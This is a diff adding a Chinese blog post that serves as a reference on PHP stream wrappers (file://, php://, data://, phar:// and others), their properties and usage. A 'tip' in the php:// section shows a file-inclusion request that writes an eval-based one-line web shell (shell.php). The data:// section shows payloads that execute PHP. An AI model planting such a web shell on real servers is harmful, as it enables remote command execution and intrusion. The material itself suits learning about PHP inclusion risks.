@@ -4,6 +4,26 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0">
 
+  <meta name="description" content="前言PHP伪协议：PHP支持的协议和封装协议，用于类似fopen()、copy()、file_exist()、filesize()的文件系统函数 。
+
+
+
+协议
+用途
+
+
+
+file://
+访问本地文件系统
+
+
+http://  (https://)
+访问HTPP(S)网址
+
+
+ftp://
+访问F">
+
 
 <link rel="alternate" href="/atom.xml" title="Gu Chuan&#39;s blog" type="application/atom+xml">
 <meta name="theme-color" content="#a1d0f6">
@@ -36,7 +56,158 @@
         </h2>
     </header>
 </article>
-<section id="post-body"></section>
+<section id="post-body"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://www.php.net/manual/zh/wrappers.php" target="_blank" rel="noopener">PHP伪协议</a>：PHP支持的协议和封装协议，用于类似fopen()、copy()、file_exist()、filesize()的<a href="https://www.php.net/manual/zh/ref.filesystem.php" target="_blank" rel="noopener">文件系统函数</a> 。</p>
+<table>
+<thead>
+<tr>
+<th align="center">协议</th>
+<th align="center">用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">file://</td>
+<td align="center">访问本地文件系统</td>
+</tr>
+<tr>
+<td align="center">http://  (https://)</td>
+<td align="center">访问HTPP(S)网址</td>
+</tr>
+<tr>
+<td align="center">ftp://</td>
+<td align="center">访问FTP(S) URLs</td>
+</tr>
+<tr>
+<td align="center">php://</td>
+<td align="center">访问各个输入/输出流(I/O streams)</td>
+</tr>
+<tr>
+<td align="center">zlib://</td>
+<td align="center">压缩流</td>
+</tr>
+<tr>
+<td align="center">data://</td>
+<td align="center">数据(RFC 2397)</td>
+</tr>
+<tr>
+<td align="center">glob://</td>
+<td align="center">查找匹配的文件路径模式</td>
+</tr>
+<tr>
+<td align="center">phar://</td>
+<td align="center">PHP归档</td>
+</tr>
+<tr>
+<td align="center">ssh2://</td>
+<td align="center">Secure Shell 2</td>
+</tr>
+<tr>
+<td align="center">rar://</td>
+<td align="center">RAR</td>
+</tr>
+<tr>
+<td align="center">ogg://</td>
+<td align="center">音频流</td>
+</tr>
+<tr>
+<td align="center">expect://</td>
+<td align="center">处理交互式的流</td>
+</tr>
+</tbody></table>
+<p>allow_url_fopen ：on  默认开启 。该选项为on便是激活了 URL 形式的 fopen 封装协议，使得可以<code>访问 URL 对象文件</code>等。</p>
+<p>allow_url_include：off  默认关闭。该选项为on便是允许<code>包含URL 对象文件</code>等。</p>
+<hr>
+<h1 id="0x01-file"><a href="#0x01-file" class="headerlink" title="0x01 file://"></a>0x01 <a href="https://www.php.net/manual/zh/wrappers.file.php" target="_blank" rel="noopener">file://</a></h1><p><code>属性</code></p>
+<ol>
+<li>不受 allow_url_fopen 、 allow_url_include 影响。</li>
+<li>允许读取、写入、添加、同时读和写。</li>
+<li>支持stat()、unlink()、rename()、mkdir()、rmdir()文件系统函数。</li>
+</ol>
+<p><code>用法</code></p>
+<p>file://绝对路径和文件名</p>
+<h1 id="0x02-http-–https"><a href="#0x02-http-–https" class="headerlink" title="0x02 http://–https://"></a>0x02 <a href="https://www.php.net/manual/zh/wrappers.http.php" target="_blank" rel="noopener">http://–https://</a></h1><p> http://(超文本传输协议)：是一个基于请求与响应，无状态的，应用层的协议，常基于TCP/IP协议传输数据，互联网上应用最为广泛的一种网络协议,所有的WWW文件都必须遵守这个标准。 </p>
+<p>https://：是一种通过计算机网络进行安全通信的传输协议，经由HTTP进行通信，利用SSL/TLS建立全信道，加密数据包。HTTPS使用的主要目的是提供对网站服务器的身份认证，同时保护交换数据的隐私与完整性。 </p>
+<p>简单地说：HTTPS是HTTP的升级版。</p>
+<p><code>属性</code></p>
+<ol>
+<li>受allow_url_fopen 、 allow_url_include 影响。</li>
+<li>允许读取、不允许写入和添加和同时读写。</li>
+<li>不支持stat()、unlink()、rename()、mkdir()、rmdir()文件系统函数。</li>
+</ol>
+<p><code>用法</code></p>
+<p>https:// host:port/path?query#fragment </p>
+<p>即http://网络路径和文件名。</p>
+<h1 id="0x03-ftp-–ftps"><a href="#0x03-ftp-–ftps" class="headerlink" title="0x03 ftp://–ftps://"></a>0x03 <a href="https://www.php.net/manual/zh/wrappers.ftp.php" target="_blank" rel="noopener">ftp://–ftps://</a></h1><p> FTP协议包括两个组成部分，其一为FTP服务器，其二为FTP客户端。其中FTP服务器用来存储文件，用户可以使用FTP客户端通过FTP协议访问位于FTP服务器上的资源。FTP传输效率非常高 。</p>
+<p><code>属性</code></p>
+<ol>
+<li>受allow_url_fopen影响。</li>
+<li>允许读取、写入、添加，但不允许同时读和写。</li>
+<li>支持stat()、unlink()、rename()、mkdir()、rmdir()文件系统函数。</li>
+</ol>
+<p><code>用法</code></p>
+<p> ftp://用户名：密码@FTP服务器IP或域名：FTP命令端口/路径/文件名 </p>
+<h1 id="0x04-php"><a href="#0x04-php" class="headerlink" title="0x04 php://"></a>0x04 <a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">php://</a></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">php标准输入输出：</span><br><span class="line">php://stdin     用法：fopen(&quot;php://stdin&quot;,&apos;r&apos;) 等同于STDIN文件句柄。</span><br><span class="line">php://stdout    用法：fopen(&quot;php://stdout&quot;,&apos;w&apos;) 等同于STDOUT文件句柄。</span><br><span class="line">php://stderr    用法：fopen(&quot;php://stderr&quot;,&apos;w&apos;) 等同于STDERR文件句柄。</span><br><span class="line"></span><br><span class="line">php://input     POST 请求的情况下，可以访问请求的原始数据的只读流。</span><br><span class="line">				enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的。</span><br><span class="line">php://output    只写的数据流。允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</span><br><span class="line">				用法：fopen(&quot;php://output&quot;,&apos;W&apos;)。</span><br><span class="line"></span><br><span class="line">php://fd        允许直接访问指定的文件描述符。允许读取、写入、追加。(&gt;=5.3.6)</span><br><span class="line"></span><br><span class="line">php://memory	文件包装器的数据流，数据存储在内存中。(&gt;=5.1.0)</span><br><span class="line">php://temp		文件包装器的数据流，数据大于预定义内存量时，存入临时文件。(&gt;=5.1.0)</span><br><span class="line"></span><br><span class="line">php://filter	元封装器，设计用于数据流打开时的筛选应用。(&gt;=5.0.0)</span><br><span class="line">				用法：php://filter/read=&lt;过滤器，多个过滤器以|分割&gt;/resource=&lt;待过滤筛选的数据流&gt;</span><br><span class="line">					 php://filter/write=&lt;过滤器，多个过滤器以|分割&gt;/resource=&lt;待过滤筛选的数据流&gt;</span><br><span class="line">					 php://filter/resource=&lt;待过滤筛选的数据流&gt;</span><br><span class="line">				例子：</span><br><span class="line">				readfile(&quot;php://filter/read=string.toupper/resource=http://www.example.com&quot;);</span><br><span class="line">				</span><br><span class="line">				file_put_contents(&quot;php://filter/write=string.rot13/resource=example.txt&quot;,&quot;Hello World&quot;);</span><br><span class="line">				readfile(&quot;php://filter/resource=http://www.example.com&quot;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a><a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">过滤器</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.字符串过滤器：</span><br><span class="line">string.rot13 对字符串执行ROT13转换</span><br><span class="line">string.toupper转换为大写</span><br><span class="line">string.tolower 转换为小写</span><br><span class="line">string.strip_tags去除html和php标记</span><br><span class="line">2.转换过滤器：</span><br><span class="line">convert.base64-encode &amp; convert.base64-decode ：base64编码/解码</span><br><span class="line">convert.quoted-printable-encode &amp; convert.quoted-printable-decode：将 quoted-printable 字符串转换为 8-bit 字符串</span><br><span class="line">3.压缩过滤器：</span><br><span class="line">zlib.deflate &amp; zlib.inflate</span><br><span class="line">bzip2.compress &amp; bzip2.decompress </span><br><span class="line">创建 gzip 和 bz2 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</span><br><span class="line">4.加密过滤器：</span><br><span class="line">mcrypt.* &amp; mdecrypt.*</span><br><span class="line">使用 libmcrypt 提供了对称的加密和解密。</span><br></pre></td></tr></table></figure>
+
+<p><code>属性</code></p>
+<ol>
+<li>不需要开启allow_url_fopen。</li>
+<li>仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">小贴士：php://input写一句话</span><br><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST]</span><br><span class="line">&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_GET[cmd]); ?&gt;&apos;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x05-zlib-–bzip2-–zip"><a href="#0x05-zlib-–bzip2-–zip" class="headerlink" title="0x05 zlib://–bzip2://–zip://"></a>0x05 <a href="https://www.php.net/manual/zh/wrappers.compression.php" target="_blank" rel="noopener">zlib://–bzip2://–zip://</a></h1><p> 用于读取压缩文件。zip:// 、 bzip2:// 、 zlib://均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。 </p>
+<p><code>属性</code></p>
+<ol>
+<li>不受allow_url_fopen 、 allow_url_include 影响。</li>
+<li>允许读取、写入、附加（除zip://），不支持同时读写。</li>
+<li>不支持stat()、unlink()、rename()、mkdir()、rmdir()文件系统函数。</li>
+</ol>
+<p><code>用法</code></p>
+<p>zip://archive.zip#dir/file.txt                即  zip://压缩文件绝对路径%23压缩文件内的子文件名        %23=&gt;#</p>
+<p>compress.bzip2://file.bz2                   即  compress.bzip2://文件后缀名.bz2绝对路径或相对路径</p>
+<p>compress.zlib://file.gz                         即  compress.zlib://文件后缀名.gz绝对路径或相对路径</p>
+<h1 id="0x06-data"><a href="#0x06-data" class="headerlink" title="0x06 data://"></a>0x06 <a href="https://www.php.net/manual/zh/wrappers.data.php" target="_blank" rel="noopener">data://</a></h1><p> 数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。(&gt;=5.2.0) </p>
+<p><code>属性</code></p>
+<ol>
+<li>受allow_url_fopen 、 allow_url_include 影响。</li>
+<li>允许读取，不允许写入、追加、同时读写。</li>
+<li>不支持stat()、unlink()、rename()、mkdir()、rmdir()文件系统函数。</li>
+</ol>
+<p><code>用法</code></p>
+<p>data://text/plain,<?php phpinfo();?></p>
+<p>data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</p>
+<h1 id="0x07-glob"><a href="#0x07-glob" class="headerlink" title="0x07 glob://"></a>0x07 <a href="https://www.php.net/manual/zh/wrappers.glob.php" target="_blank" rel="noopener">glob://</a></h1><p> 返回匹配指定模式的文件名或目录。 (&gt;=5.3.0)</p>
+<p><code>属性</code></p>
+<ol>
+<li>不受allow_url_fopen 、 allow_url_include 影响。</li>
+<li>不允许读取、写入、附加、同时读写。</li>
+<li>不支持stat()、unlink()、rename()、mkdir()、rmdir()文件系统函数。</li>
+</ol>
+<p><code>用法</code></p>
+<p> glob://匹配文件路径和文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 循环 ext/spl/examples/ 目录里所有 *.php 文件</span><br><span class="line">// 并打印文件名和文件尺寸</span><br><span class="line">$it = new DirectoryIterator(&quot;glob://ext/spl/examples/*.php&quot;);</span><br><span class="line">foreach($it as $f) &#123;</span><br><span class="line">    printf(&quot;%s: %.1FK\n&quot;, $f-&gt;getFilename(), $f-&gt;getSize()/1024);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x08-phar"><a href="#0x08-phar" class="headerlink" title="0x08 phar://"></a>0x08 <a href="https://www.php.net/manual/zh/wrappers.phar.php" target="_blank" rel="noopener">phar://</a></h1><p> phar是什么?Phar归档最好的特点是可以方便地将多个文件组合成一个文件。 </p>
+<p><code>属性</code></p>
+<ol>
+<li>不受allow_url_fopen 、 allow_url_include 影响。</li>
+<li>允许读取、写入、同时读写，但不允许附加。</li>
+<li>支持stat()、unlink()、rename()、mkdir()、rmdir()文件系统函数。</li>
+</ol>
+<p><code>用法</code></p>
+<p> phar:// 压缩文件后缀名改后文件及路径/压缩文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://./test.jpg/test.php          test.jpg是一个里面含有test.php的压缩包，改了后缀名。</span><br></pre></td></tr></table></figure>
+
+<p> <a href="https://xz.aliyun.com/t/3692" target="_blank" rel="noopener">Phar的一些利用姿势</a></p>
+<h1 id="0x09-ssh2"><a href="#0x09-ssh2" class="headerlink" title="0x09 ssh2://"></a>0x09 <a href="https://www.php.net/manual/zh/wrappers.ssh2.php" target="_blank" rel="noopener">ssh2://</a></h1><h1 id="0x10-rar"><a href="#0x10-rar" class="headerlink" title="0x10 rar://"></a>0x10 <a href="https://www.php.net/manual/zh/wrappers.rar.php" target="_blank" rel="noopener">rar://</a></h1><h1 id="0x11-ogg"><a href="#0x11-ogg" class="headerlink" title="0x11 ogg://"></a>0x11 <a href="https://www.php.net/manual/zh/wrappers.audio.php" target="_blank" rel="noopener">ogg://</a></h1><h1 id="0x12-expect"><a href="#0x12-expect" class="headerlink" title="0x12 expect://"></a>0x12 <a href="https://www.php.net/manual/zh/wrappers.expect.php" target="_blank" rel="noopener">expect://</a></h1></section>
+    
+        
+        <h2 class="footline">
+            <a href="/tags/knowledge/#knowledge">knowledge</a>
+        </h2>
     
 
     <footer id="post-meta" class="clearfix">
